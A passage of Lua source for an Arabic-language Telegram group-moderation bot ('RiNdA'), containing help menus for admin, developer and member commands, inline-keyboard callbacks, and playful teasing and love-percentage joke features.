⊀︰ استعاده الاوامر 
⊀︰ تحويل كالاتي< بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
⊀︰ صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
⊀︰ كشف القيود
⊀︰ تعين الايدي
⊀︰ تغير الايدي
⊀︰ الحساب + ايدي الحساب
⊀︰ تنظيف + العدد
⊀︰ نزل الكل
⊀︰ نزل جميع الرتب
⊀︰ منع + برد
⊀︰ ~ الصور + متحركه + ملصق ~
⊀︰ حظر ~ كتم ~ تقيد ~ طرد
⊀︰ المحظورين ~ المكتومين ~ المقيدين
⊀︰ الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
⊀︰ تقيد ~ كتم + الرقم + ساعه
⊀︰ تقيد ~ كتم + الرقم + يوم
⊀︰ تقيد ~ كتم + الرقم + دقيقه
⊀︰ تثبيت ~ الغاء تثبيت
⊀︰ الترحيب
⊀︰ الغاء تثبيت الكل
⊀︰ كشف البوتات
⊀︰ الصلاحيات
⊀︰ كشف ~ برد ← بمعرف ← ايدي
⊀︰ تاك للكل
⊀︰ خلي لقب + لقب
⊀︰ حذف لقب بالرد
⊀︰ اعدادات المجموعه
⊀︰ عدد الكروب
⊀︰ ردود المدير
⊀︰ اسم بوت + الرتبه
⊀︰ الاوامر المضافه
⊀︰ خلي توحيد + توحيد
⊀︰ تعين عدد الكتم + رقم
⊀︰ كتم اسم + اسم
⊀︰ التوحيد
⊀︰ غنيلي
⊀︰ قائمه المنع
⊀︰ نسبه الحب 
⊀︰ نسبه رجوله
⊀︰ نسبه الكره
⊀︰ نسبه الانوثه
⊀︰ الساعه
⊀︰ التاريخ
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help7' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🤹🏻∫𝙵𝚄𝙽𝙽𝚈 𝙾𝚁𝙳𝙴𝚁𝚂 .
●━━━━𝐑𝐀━━━━●
⊀︰ الاوامر التحشيش 🃏
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← الامࢪ ↓
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← مطي 
⊀︰ تاك للمطايه
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← صخل
⊀︰ تاك لصخوله
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← جلب
⊀︰ تاك لجلاب
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← قرد 
⊀︰ تاك لقروده
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← بقره
⊀︰ تاك لبقرات
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← ضلع
⊀︰ تاك لضلوع
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← ضلعه
⊀︰ تاك للضلعات
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← طلي
⊀︰ تاك لطليان
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← زاحف 
⊀︰ تاك لزواحف
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← جريذي
⊀︰ تاك لجريذيه
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← الصاك
⊀︰ تاك للصاكين
●━━━━𝐑𝐀━━━━●
⊀︰ ارفع + نزل ← الحاته
⊀︰ تاك للحاتات
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help8' then
if not Sudo(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🏅∫𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁𝚂' 𝙾𝚁𝙳𝙴𝚁𝚂 .
●━━━━𝐑𝐀━━━━●
⊀︰ اوامر المطورين ( 👥).
●━━━━𝐑𝐀━━━━●
⊀︰ تفعيل ← تعطيل 
⊀︰ المجموعات ← المشتركين ← الاحصائيات
⊀︰ ارفع ← نزل منشئ اساسي
⊀︰ مسح الاساسين ← المنشئين الاساسين
⊀︰ مسح المنشئين ← المنشئين
⊀︰ اسم ~ ايدي + بوت غادر 
⊀︰ اذاعه 
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help9' then
if not Sudo(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
🎖∫ 𝙱𝙰𝚂𝙸𝙲 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂 .
●━━━━𝐑𝐀━━━━●
⊀︰ اهلا بك عزيزي ✓
⊀︰ اوامر مطور الاساسي 👨🏼‍✈️
●━━━━𝐑𝐀━━━━●
⊀︰ تفعيل
⊀︰ تعطيل
⊀︰ مسح الاساسين
⊀︰ المنشئين الاساسين
⊀︰ ارفع/نزل منشئ اساسي
⊀︰ ارفع/نزل مطور ثانوي 
⊀︰ مسح المطورين
⊀︰ المطورين
⊀︰ ارفع | نزل مطور
●━━━━𝐑𝐀━━━━●
⊀︰ اسم البوت + غادر
⊀︰ غادر
⊀︰ اسم بوت + الرتبه
⊀︰ تحديث ريندا
⊀︰ حضر عام
⊀︰ كتم عام
⊀︰ الغاء العام
⊀︰ قائمه العام
⊀︰ مسح قائمه العام
⊀︰ جلب نسخه الاحتياطيه
⊀︰ ارفع نسخه الاحتياطيه
●━━━━𝐑𝐀━━━━●
⊀︰ المتجر 
⊀︰ متجر الملفات
⊀︰ الملفات
⊀︰ مسح الملفات
⊀︰ تعطيل + تفعيل + اسم ملف
●━━━━𝐑𝐀━━━━●
⊀︰ اذاعه خاص
⊀︰ اذاعه
⊀︰ اذاعه بالتوجيه
⊀︰ اذاعه بالتوجيه خاص
⊀︰ اذاعه بالتثبيت
●━━━━𝐑𝐀━━━━●
⊀︰ جلب نسخه البوت
⊀︰ ارفع نسخه البوت
⊀︰ ضع عدد الاعضاء + العدد
⊀︰ ضع كليشه المطور
⊀︰ تفعيل/تعطيل الاذاعه
⊀︰ تفعيل/تعطيل البوت الخدمي
⊀︰ تفعيل/تعطيل التواصل
⊀︰ تغير اسم البوت
⊀︰ اضف/حذف رد للكل
⊀︰ ردود المطور
⊀︰ مسح ردود المطور
●━━━━𝐑𝐀━━━━●
⊀︰ الاشتراك الاجباري
⊀︰ تعطيل الاشتراك الاجباري
⊀︰ تفعيل الاشتراك الاجباري
⊀︰ حذف رساله الاشتراك
⊀︰ تغير رساله الاشتراك
⊀︰ تغير الاشتراك
●━━━━𝐑𝐀━━━━●
⊀︰ الاحصائيات
⊀︰ المشتركين
⊀︰ المجموعات 
⊀︰ تفعيل/تعطيل المغادره
⊀︰ تنظيف المشتركين
⊀︰ تنظيف الكروبات
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help10' then
local help_text = database:get(bot_id..'help10_text')
local Teext =[[
 𝙼𝙴𝙼𝙱𝙴𝚁 𝙾𝚁𝙳𝙴𝚁𝚂 .
⊀︰ اهلا بك عزيزي ✓ .
⊀︰ اوامر الاعضاء كالتالي ↓
●━━━━𝐑𝐀━━━━●
⊀︰ عرض معلوماتك ↑↓
●━━━━𝐑𝐀━━━━●
⊀︰ ايديي ← اسمي 
⊀︰ رسايلي ← مسح رسايلي 
⊀︰ رتبتي ← سحكاتي 
⊀︰ مسح سحكاتي ← المنشئ 
●━━━━𝐑𝐀━━━━●
⊀︰ اوآمر المجموعه ↑↓
●━━━━𝐑𝐀━━━━●
⊀︰ الرابط ← القوانين – الترحيب
⊀︰ ايدي ← اطردني 
⊀︰ اسمي ← المطور  
⊀︰ كشف ~ بالرد بالمعرف
⊀︰ كول + كلمه
●━━━━𝐑𝐀━━━━●
⊀︰ اسم البوت + الامر ↑↓
●━━━━𝐑𝐀━━━━●
⊀︰ بوسه بالرد 
⊀︰ مصه بالرد
⊀︰ رزله بالرد 
⊀︰ شنو رئيك بهذا بالرد
⊀︰ شنو رئيك بهاي بالرد
⊀︰ تحب هذا
●━━━━𝐑𝐀━━━━●ٴ
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/help"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help' then
if not Mod(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
𝖶𝖾𝖫𝖢𝗈𝖬𝖾 𝗍𝖮 𝖱𝗂𝖭𝖣𝖺 𝗅𝖭𝖿𝖮 ↴
*- مَ1 ↫ اوامࢪ سـد 𝖺𝖭𝖽 افتح*
*- مَ2 ↫ اوامࢪ تعطيـل 𝖺𝖭𝖽 تفعـيل*
*- مَ3 ↫ اوامࢪ خلـي 𝖺𝖭𝖽 اضف*
*- مَ4 ↫ اوامࢪ مسـح 𝖺𝖭𝖽 حـذف*
*- مَ5 ↫ اوامࢪ نـزل 𝖺𝖭𝖽 ارفـع 𝖺𝖭𝖽 غيࢪ*
*- مَ6 ↫ اوامࢪ ترتيـب الڪروب *
*- مَ7 ↫ اوامࢪ التسلـيه *
*- مَ8 ↫ اوامࢪ المطوريـن *
*- مَ9 ↫ اوامـࢪ مطـور الاساسـي *
*- مَ10 ↫ اوامࢪ ﭑݪعضوَ *
●━━━━𝐑𝐀━━━━●
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '- مَ1 ', callback_data="/help1"},{text = '- مَ2 ', callback_data="/help2"},{text = '- مَ3 ', callback_data="/help3"},
},
{
{text = '- مَ4 ', callback_data="/help4"},{text = '- مَ5 ', callback_data="/help5"},
},
{
{text = '- مَ6 ', callback_data="/help6"},{text = '- مَ7 ', callback_data="/help7"},{text = '- مَ8 ', callback_data="/help8"},
},
{
{text = '- مَ9 ', callback_data="/help9"},{text = '- مَ10 ', callback_data="/help10"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
------------------------------ callback add dev mr mode
if Text == '/mute-name' then
if not Constructor(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
*انت الان في قائمة كتم الأسماء*
●━━━━𝐑𝐀━━━━●
*الاوامر الخاصة فـي كتم الاسماء*
*تفعيل كتم الاسم*
*تعطيل كتم الاسم*
*الاسماء المكتومه*
*كتم اسم + الاسم المراد كتمه*
*الغاء كتم اسم + الاسم المراد الغاء كتمه*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/mode"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/add"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/mode' then
if not Constructor(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
*انت الان في قائمة التوحيد*
●━━━━𝐑𝐀━━━━●
*الاوامر الخاصة فـي التوحيد *
*تفعيل التوحيد*
*تعطيل التوحيد*
*خلي توحيد + التوحيد*
*تعين عدد الكتم + عدد*
*التوحيد*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/mode"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/add"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-names' then
if not Constructor(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
*انت الان في قائمة تنبيه الاسماء*
●━━━━𝐑𝐀━━━━●
*الاوامر الخاصة فـي تنبيه الاسماء *
*تفعيل تنبيه الاسماء*
*تعطيل تنبيه الاسماء*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/mode"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/add"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-id' then
if not Constructor(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
*انت الان في قائمة تنبيه المعرف*
●━━━━𝐑𝐀━━━━●
*الاوامر الخاصة فـي تنبيه المعرف*
*تفعيل تنبيه المعرف*
*تعطيل تنبيه المعرف*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/mode"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/add"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-photo' then
if not Constructor(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
*انت الان في قائمة تنبيه الصور*
●━━━━𝐑𝐀━━━━●
*الاوامر الخاصة فـي تنبيه الصور*
*تفعيل تنبيه الصور*
*تعطيل تنبيه الصور*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/mode"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '↑𝐁𝐚𝐜𝐤 𝐭𝐨 𝐥𝐢𝐬𝐭↑', callback_data="/add"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
--- callback added
if Text == '/add' then
if not Constructor(data) then
local notText = '⊀︰ . عـذࢪا الاوامࢪ هـذه لا تخصـك...🕸️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
*اهلا انـت في اضـافـات البـوت🦖*
*●━━━━𝐑𝐀━━━━●*
* يمكنك معرفـة حاله تفعيل الاضافات *
* من خلال ارسال {حاله الاضافات} *
*●━━━━𝐑𝐀━━━━●*
*يمكنك تصفح الاضـافات من خلـال*
*الكيـبوࢪد الموجـود فـي الأسفـل*
ـ قنـاه السوࢪس..↓
⊀︰ . [<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>](t.me/SourcE_RiNdA)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/mode"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
{text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
},
{
{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼>', url="t.me/SourcE_RiNdA"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if text and not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:del(bot_id..'Spam:Texting'..msg.sender_user_id_) 
end
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
if NewCmmd then
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
database:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'* ⊀︰ تم حذف الامر*')  
else
send(msg.chat_id_, msg.id_,'* ⊀︰ لا يوجد امر بهاذا الاسم*')  
end
database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end 
-------------------------------------------------------------------------------------------------------------- 
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if (text and text == "*تعطيل اوامر التحشيش*") then 
send(msg.chat_id_, msg.id_, '* ⊀︰ تم تعطيل اوامر التحشيش*')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "*تفعيل اوامر التحشيش*") then 
send(msg.chat_id_, msg.id_, '*  ⊀︰ تم تفعيل اوامر التحشيش*')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ريندا')
if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 🍫🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير ا��حب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' تحب هذا' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب ميدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text == "نسبه الحب" or text == "نسبه حب" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال : رسول و عذراء'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الحب" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
